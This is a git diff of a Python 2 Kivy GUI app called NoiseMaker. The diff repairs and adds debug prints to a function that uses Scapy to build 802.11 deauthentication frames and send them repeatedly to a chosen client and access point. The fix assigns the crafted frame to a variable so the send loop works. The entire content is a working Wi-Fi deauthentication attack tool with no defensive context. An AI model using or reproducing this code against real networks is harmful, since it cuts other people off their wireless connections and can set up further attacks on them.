@@ -7,22 +7,29 @@ from kivy.app import App
 from kivy.uix.gridlayout import GridLayout
 
 class NoiseMakerFunc(GridLayout):
-    def SendPacket (self,iface,target,decount,ssid):  
-        if iface:
-            try:
-                client = self.ids.target.text
-                ssid = self.ids.ssid.text
-                count = self.ids.decount.text
-                conf.iface = self.ids.iface.text
-                conf.verb = 0
-                
-                RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=ssid,addr3=ssid)/Dot11Deauth(reason=7)
-                for n in range(int(count)):
-                    sendp(packet)
-                    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + ssid + ' for Client: ' + client
+    def SendPacket (self, iface,target,decount,ssid):  
+        print "Function is called"
+        try:
+            print "one"
+            client = target
+            nssid = ssid
+            count = decount
+            conf.iface = iface
+            print client + ":" + count + ":" + nssid + ":" + conf.iface
+            conf.verb = 0
+            print "two"
+            packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=nssid,addr3=nssid)/Dot11Deauth(reason=7)
+            print "three"
+            for n in range(int(count)):
+                print "four"
+                sendp(packet)
+                print "four point five"
+                print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + ssid + ' for Client: ' + client
+                print "five"
 
-            except Exception:
-                self.ids.resultOutput.text = "Error"
+        except Exception, c:
+            self.ids.resultOutput.text = "Error"
+            print c
                 
 class NoiseMakerApp(App):
 
